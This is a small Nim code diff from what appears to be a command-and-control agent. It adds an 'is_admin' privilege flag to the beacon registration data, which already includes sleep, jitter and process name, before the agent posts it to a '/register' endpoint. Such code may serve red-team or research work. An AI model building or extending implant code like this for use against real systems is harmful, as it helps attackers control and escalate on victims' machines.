@@ -165,6 +165,7 @@ proc register*(t: var AgentTransport): bool =
     "sleep_sec":    SleepSec,
     "jitter_pct":   JitterPct,
     "process_name": exeName(),
+    "is_admin":     isElevated(),
     "language":     "nim"
   }
   let (code, resp) = t.winHttpDo("POST", "/register", cast[seq[byte]]($info))
